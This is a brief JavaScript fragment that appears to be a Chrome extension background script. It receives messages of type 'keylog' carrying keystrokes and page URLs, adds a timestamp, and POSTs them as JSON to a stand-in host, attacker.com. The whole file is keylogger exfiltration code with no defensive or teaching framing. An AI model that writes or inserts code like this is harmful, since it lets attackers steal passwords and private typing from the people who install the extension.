chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "keylog") {
    const data = {
      key: message.key,
      url: message.url,
      timestamp: new Date().toISOString()
    };

    fetch("https://attacker.com/keylog", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (!response.ok) {
        console.error("Server error:", response.status);
      }
    })
    .catch(error => console.error("Network error:", error));
  }
});
